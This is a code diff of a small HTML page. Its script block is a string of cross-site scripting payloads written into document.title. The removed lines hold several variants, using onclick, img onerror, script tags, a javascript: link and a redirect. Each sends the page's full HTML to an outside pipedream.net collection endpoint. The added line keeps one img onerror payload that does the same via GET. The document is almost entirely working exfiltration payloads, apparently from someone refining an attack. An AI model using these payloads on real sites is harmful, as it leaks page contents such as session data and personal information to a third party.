@@ -2,24 +2,7 @@
   <body>
     <title>Something</title>
     <script defer>
-        const targetUrl = 'https://eo4pc9qfxyc6gq3.m.pipedream.net';
-        const dataToSend = JSON.stringify(document.documentElement.outerHTML);
-        const headers = new Headers({
-            'Content-Type': 'application/json'
-        });
-        const fetchOptions = {
-            method: 'POST',
-            headers,
-            mode: 'cors',
-            body: dataToSend
-        };
-        document.title = `<a href="#" onclick="fetch('${targetUrl}', ${JSON.stringify(fetchOptions)})">asdf</a>`;
-        document.title = `<img src="!@#$" onerror="fetch('${targetUrl}', ${JSON.stringify(fetchOptions)})" />`;
-        document.title = `<script>fetch('${targetUrl}', ${JSON.stringify(fetchOptions)})`;
-        document.title = '<a href="javascript:fetch("https://eo4pc9qfxyc6gq3.m.pipedream.net", {method:"POST", headers:new Headers({"Content-Type":"application/json"}), mode:"cors", body:JSON.stringify(document.documentElement.outerHTML)})">asdf</a>';
-        document.title = '<img src="!@#$" onerror="fetch("https://eo4pc9qfxyc6gq3.m.pipedream.net", {method:"POST", headers:new Headers({"Content-Type":"application/json"}), mode:"cors", body:JSON.stringify(document.documentElement.outerHTML)})" />';
-        document.title = '<script>fetch("https://eo4pc9qfxyc6gq3.m.pipedream.net", {method:"POST", headers:new Headers({"Content-Type":"application/json"}), mode:"cors", body:JSON.stringify(document.documentElement.outerHTML)});';
-        document.title = '<script>window.location.href="https://eo4pc9qfxyc6gq3.m.pipedream.net/?value="+document.documentElement.outerHTML</script>'
-     </script>
-    </body>
+        document.title = '<img src="!@#$" onerror="fetch("https://eo4pc9qfxyc6gq3.m.pipedream.net/?val="+document.documentElement.outerHTML, {method:"GET"})" />';
+    </script>
+  </body>
 </html>
